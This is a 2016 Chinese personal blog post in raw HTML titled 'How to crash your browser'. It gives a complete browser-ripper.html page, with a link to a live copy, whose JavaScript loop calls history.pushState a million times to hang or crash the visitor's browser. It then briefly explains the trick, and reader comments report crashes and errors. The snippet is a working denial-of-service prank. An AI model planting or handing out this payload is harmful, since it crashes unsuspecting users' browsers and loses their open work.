<!doctype html><html lang=en><head><meta charset=utf-8><meta content="width=device-width,initial-scale=1.0" name=viewport><meta content=#000000 id=color_chrome name=theme-color><meta content=#000000 id=color_safari name=apple-mobile-web-app-status-bar-style><meta content="EAimTY's Blog" name=description><link rel="Shortcut Icon" href=https://www.eaimty.com/favicon.ico><link href=https://www.eaimty.com/favicon.ico rel=Bootmark><link title="EAimTY's Blog" href=https://www.eaimty.com/rss.xml rel=alternate type=application/rss+xml><style>#title,body{line-height:1.6em}body{background:#000;color:#00c000;font-size:1.2em}#container{margin:2.4em auto;width:72%}#header{text-align:center}#header>a{font-size:.96em;margin:auto 1em}#title{font-size:1.6em;font-weight:700;margin:1em auto}#date{font-style:italic}#list>li{margin:.8em auto;list-style:disc}img{max-width:100%}a{color:inherit;text-decoration:none}#content a,a:hover{text-decoration:underline}pre{padding:1em;overflow:auto;background:#1b1d16}:not(pre) >code{padding:.2em;background:#1b1d16;overflow:auto}blockquote{padding:0 1em;margin:0;border-left:.25em solid #212121}@media (max-width:600px){#container{width:88%}#header>a{margin:auto .3em}}</style><title>如何将浏览器炸掉 - EAimTY's Blog</title><body><div id=header><a href=https://www.eaimty.com>EAimTY's Blog</a><a href=https://www.eaimty.com/about/>About</a><a href=https://www.eaimty.com/friends/>Friends</a></div><div id=container><a href=https://www.eaimty.com/2016/how-to-crash-browser/ id=title>如何将浏览器炸掉</a><div id=date>2016-01-27</div><div id=content><p>如何将浏览器炸掉？<p>你可以直接打开<a href=/various/browser-ripper.html>这个链接</a> 或者，你也可以新建一个文件 <code>browser-ripper.html</code>，内容如下：<pre class=language-html data-lang=html><code class=language-html data-lang=html>&LThtml>
  &LThead>
    &LTtitle>等待 10 秒，便可享受到飞一般的感觉&LT/title>
  &LT/head>
  &LTbody>
    &LTh1>抓紧，要上天了！&LT/h1>
    &LTscript>
      var total = "";
      for (var i = 0; i&LT1000000; i++) {
        total = total + i.toString();
        history.pushState(0,0,total);
      }
    &LT/script>
  &LT/body>
&LT/html>
</code></pre><p>然后用浏览器打开它<p>你真的打开它了😂？ 是不是很爽？😂我们来看看原理<p>嗯...大家都能看出来这是一个 JS 循环，而重点就在于 <code>history.pushState</code> 这句。 而<code>history.pushState</code>是什么呢？ 大家可能或多或少都听说过 pjax（没错，本博客就在用），而而 pjax 中的这个“p”在某种意义上代表的就是 <code>history.pushState</code>，这是现代浏览器普遍支持的一种添加浏览历史记录的方法。 是不是觉得豁然开朗？没错！这一段 JS 就是在向你的浏览器历史里塞进 1000000 条记录😂 （逃<hr><p>本文参考了： <a href=https://twitter.com/cyber__sec/status/689070600653041664>Cyber Security 的 Tweet</a></div><div id=comments-issue-id style=display:none>6</div><div id=comments-addition style=display:none>[{"user":{"login":"David Colin","html_url":"https://www.xmu714.site","avatar_url":"https://secure.gravatar.com/avatar/98cc9fcd1382e7eba5ec9dfdcb97fed6?d=retro"},"created_at":"2017-07-31T07:47:29Z","body":"刚用了博主的主题，有点意思"},{"user":{"login":"我来打酱油了","avatar_url":"https://secure.gravatar.com/avatar/?d=retro"},"created_at":"2018-11-13T07:37:37Z","body":"可恶"},{"user":{"login":"啦啦啦","avatar_url":"https://secure.gravatar.com/avatar/?d=retro"},"created_at":"2020-03-23T12:02:18Z","body":"怪不得备案信息那么猖狂，原来网站不在境内。封站警告[滑稽]"},{"user":{"login":"明年我开会员","avatar_url":"https://secure.gravatar.com/avatar/ef465e95972160bd6ea3bdce9e5f8d5c?d=retro"},"created_at":"2016-01-29T05:06:14Z","body":"666"},{"user":{"login":"Space520","avatar_url":"https://secure.gravatar.com/avatar/1b936d729bf7f50c7a58961dfec6026e?d=retro"},"created_at":"2023-03-09T09:43:47Z","body":"> 刚用了博主的主题，有点意思\n\nhello，你好。"},{"user":{"login":"Space520","avatar_url":"https://secure.gravatar.com/avatar/1b936d729bf7f50c7a58961dfec6026e?d=retro"},"created_at":"2023-03-04T06:18:38Z","body":"666牛逼！"},{"user":{"login":"watermelon","html_url":"https://mowatermelon.github.io","avatar_url":"https://secure.gravatar.com/avatar/9e2261a1f5b9cca7fc32299dd9ba808e?d=retro"},"created_at":"2017-09-05T03:38:50Z","body":"大ie 对象不支持“pushState”属性或方法"},{"user":{"login":"miko","avatar_url":"https://secure.gravatar.com/avatar/9ca79578003669fa05dad5fb5915d84b?d=retro"},"created_at":"2020-04-02T16:53:20Z","body":"好奇心让我点了链接，，果然要重启浏览器😂"},{"user":{"login":"ortt","avatar_url":"https://secure.gravatar.com/avatar/867ae57702dd9d4ebd40b2977e63497e?d=retro"},"created_at":"2023-02-23T13:37:08Z","body":"edge：浏览器并没有崩， 只是报错了 \n```sh\nUncaught DOMException: Failed to execute 'pushState' on 'History': A history state object with URL 'file:///C:/Users/username/Desktop/0' cannot be created in a document with origin 'null' and URL 'file:///C:/Users/username/Desktop/test.html'.\n at file:///C:/Users/username/Desktop/test.html:11:17\n```"},{"user":{"login":"Shadow","avatar_url":"https://secure.gravatar.com/avatar/fc210811ce0caa54a69709287dd1e028?d=retro"},"created_at":"2018-05-20T14:41:07Z","body":"出乱码惹（用的Safari）"}]</div><style>#comment-header,#comment-list>li{margin:1em auto}#comment-avatar,#comment-tip{margin:auto .2em}#comment-action-avatar,#comment-avatar{width:1em;height:1em}#comment-action-info>*,#comment-action-input>*,#comment-info>*{display:inline-block;vertical-align:middle}#comment-header{font-size:1.6em;font-weight:700;line-height:1.6em}#comment-tip{font-style:italic}#comment-list{list-style:none;padding:0}#comment-action-author,#comment-author{font-weight:700;margin:auto .4em}#comment-datetime{font-size:.8em;font-style:italic}#comment-body{margin:auto 1.8em}#comment-action-info>*{margin:1em .2em}#comment-action-input{height:2em;width:100%;margin:1em auto}#comment-action-input>*{height:100%;margin:0 .2em}#comment-action-textarea{width:calc(100% - 8em)}#comment-action-post{width:6em}#comment-action-login{margin:1em .3em}</style><ol id=comment-list></ol><div id=comment-action></div><script>const y=e=>{var t=/\\([\\\|`*_{}\[\]()#+\-~])/g,n=/\n *&gt; *([^]*?)(?=(\n|$){2})/g,i=/\n( *)(?:[*\-+]|((\d+)|([a-z])|[A-Z])[.)]) +([^]*?)(?=(\n|$){2})/g,o=/(^|[^A-Za-z\d\\])(([*_])|(~)|(\^)|(--)|(\+\+)|`)(\2?)([^<]*?)\2\8(?!\2)(?=\W|_|$)/g,a=/^.*\n( *\|( *:?-+:?-+:? *\|)* *\n|)/,c=/.*\n/g,m=/\||(.*?[^\\])\|/g;const l=(t,n)=>{e=e.replace(t,n)},d=(e,t)=>"<"+e+">"+t+"</"+e+">",r=e=>e.replace(n,((e,t)=>d("blockquote",r(u(t.replace(/^ *&gt; */gm,"")))))),s=e=>e.replace(i,((e,t,n,i,o,a)=>(e=d("li",u(a.split(RegExp("\n ?"+t+"(?:(?:\\d+|[a-zA-Z])[.)]|[*\\-+]) +","g")).map(s).join("</li><li>"))),"\n"+(n?'<ol start="'+(i?n+'">':parseInt(n,36)-9+'" style="list-style-type:'+(o?"low":"upp")+'er-alpha">')+e+"</ol>":d("ul",e))))),u=e=>e.replace(o,((e,t,n,i,o,a,c,m,l,r)=>t+d(i?l?"strong":"em":o?l?"s":"sub":a?"sup":c?"small":m?"big":"code",u(r))));var p=[],h=0;return e="\n"+e+"\n",l(/</g,"&lt;"),l(/>/g,"&gt;"),l(/\t|\r|\uf8ff/g,"  "),e=r(e),l(/^([*\-=_] *){3,}$/gm,"<hr/>"),e=s(e),l(/<\/(ol|ul)>\n\n<\1>/g,""),l(/\n((```|~~~).*\n?([^]*?)\n?\2|((    .*?\n)+))/g,((e,t,n,i,o)=>(p[--h]=d("pre",d("code",i||o.replace(/^    /gm,""))),h+""))),l(/((!?)\[(.*?)\]\((.*?)( ".*")?\)|\\([\\`*_{}\[\]()#+\-.!~]))/g,((e,n,i,o,a,c,m)=>(p[--h]=a?i?'<img src="'+a+'" alt="'+o+'"/>':'<a href="'+a+'">'+u(o).replace(t,"$1")+"</a>":m,h+""))),l(/&lt;(.*?)&gt;/g,((e,n)=>'<a href="'+n+'">'+u(n).replace(t,"$1")+"</a>")),l(/\n(( *\|.*?\| *\n)+)/g,((e,n)=>{var i=n.match(a)[1];return"\n"+d("table",n.replace(c,((e,n)=>e==i?"":d("tr",e.replace(m,((e,o,a)=>a?d(i&&!n?"th":"td",u(o||"").replace(t,"$1")):""))))))})),l(/(?=^|>|\n)([>\s]*?)(#{1,6}) (.*?)( #*)? *(?=\n|$)/g,((e,n,i,o)=>n+d("h"+i.length,u(o).replace(t,"$1")))),l(/(?=^|>|\n)\s*\n+([^<]+?)\n+\s*(?=\n|<|$)/g,((e,n)=>d("p",u(n).replace(t,"$1")))),l(/-\d+\uf8ff/g,(e=>p[parseInt(e,10)])),e.trim()},f=e=>{let t=t=>e.next(t),n=t=>e.throw(t);return new Promise(((i,o)=>{let a=e=>{e.done?i(e.value):Promise.resolve(e.value).then(t,n).then(a,o)};a(e.next())}))};let g;const m=document.getElementById("comments-issue-id").innerText,n=new URL(window.location.href);let q,p=n.searchParams.get("github_access_token");p&&(document.cookie=`github_access_token=${p};Path=/;Secure;SameSite=Strict`,n.searchParams.delete("github_access_token"),window.location.replace(n)),null!=p||(p=null==(q=document.cookie.split(";").find((e=>e.trim().startsWith("github_access_token="))))?void 0:q.trim().substring(20));const r=()=>{document.cookie="github_access_token=;expires=Thu, 01 Jan 1970 00:00:00 GMT;Path=/;Secure;SameSite=Strict",p=null},t=()=>f(function*(){var e;let n;if(g=JSON.parse(null!=(n=null==(e=document.getElementById("comments-addition"))?void 0:e.innerText)?n:"[]"),p){if(200!==(e=yield fetch(`https://comments.eaimty.com/comments?issue_id=${m}&github_access_token=${p}`,{method:"GET"})).status)return r(),yield t()}else e=yield fetch(`https://comments.eaimty.com/comments?issue_id=${m}`,{method:"GET"});200===e.status&&(g=g.concat(yield e.json()))}()),u=()=>{g.sort(((e,t)=>new Date(e.created_at).getTime()-new Date(t.created_at).getTime()));let e=document.getElementById("comment-list");e.innerHTML="";var t=document.createElement("div");for(t.id="comment-header",t.innerText="Comments",e.appendChild(t),0===g.length&&((t=document.createElement("div")).id="comment-tip",t.innerText="No comment yet",e.appendChild(t)),t=0;t<g.length;t++){let o=document.createElement("li");var n=document.createElement("div");n.id="comment-info";var i=document.createElement("img");i.id="comment-avatar",i.src=g[t].user.avatar_url,n.appendChild(i),(i=document.createElement("a")).id="comment-author",i.innerText=g[t].user.login,g[t].user.html_url&&(i.href=g[t].user.html_url),n.appendChild(i),(i=document.createElement("div")).id="comment-datetime",i.innerText=new Date(g[t].created_at).toLocaleString(),n.appendChild(i),o.appendChild(n),(n=document.createElement("div")).id="comment-body",n.innerHTML=y(g[t].body),o.appendChild(n),e.appendChild(o)}},v=()=>f(function*(){let e=document.getElementById("comment-action");e.innerHTML="";var n=document.createElement("div");if(n.id="comment-header",n.innerText="Leave a comment",e.appendChild(n),p){if(200===(n=yield fetch(`https://comments.eaimty.com/userinfo?github_access_token=${p}`,{method:"GET"})).status){n=yield n.json();let o=document.createElement("div");o.id="comment-action-info";var i=document.createElement("img");i.id="comment-action-avatar",i.src=n.avatar_url,o.appendChild(i),(i=document.createElement("a")).id="comment-action-author",i.innerText=n.login,i.href=n.html_url,o.appendChild(i);let a=document.createElement("button");a.id="comment-action-logout",a.innerText="Logout",a.addEventListener("click",(()=>{r(),v()})),o.appendChild(a),e.appendChild(o),(n=document.createElement("div")).id="comment-tip",n.innerText="Before commenting, please think about whether your comment is meaningful? Is it related to the topic? Is it rational and friendly? If you were someone else, would you feel uncomfortable seeing this comment?",e.appendChild(n),(n=document.createElement("div")).id="comment-action-input";let c=document.createElement("textarea");c.id="comment-action-textarea",c.placeholder="Leave a comment",n.appendChild(c);let l=document.createElement("button");return l.id="comment-action-post",l.innerText="Comment",l.addEventListener("click",(()=>f(function*(){a.disabled=!0,c.disabled=!0,l.disabled=!0;let e=c.value.trim();0!==e.length&&(201===(yield fetch(`https://comments.eaimty.com/comments?issue_id=${m}&github_access_token=${p}`,{method:"POST",body:JSON.stringify({body:e})})).status?t().then((()=>u())).then((()=>v())):(r(),yield v(),window.alert("Failed to post comment")))}()))),n.appendChild(l),void e.appendChild(n)}r()}(n=document.createElement("div")).id="comment-tip",n.innerText="Clicking the login button means you agree to use cookies to store your GitHub Access Token",e.appendChild(n),(n=document.createElement("button")).id="comment-action-login",n.innerText="Login with GitHub",n.addEventListener("click",(()=>window.location.replace(`https://comments.eaimty.com/login?redirect_uri=${window.location.href}`))),e.appendChild(n)}());t().then((()=>u())).then((()=>v()))</script></div>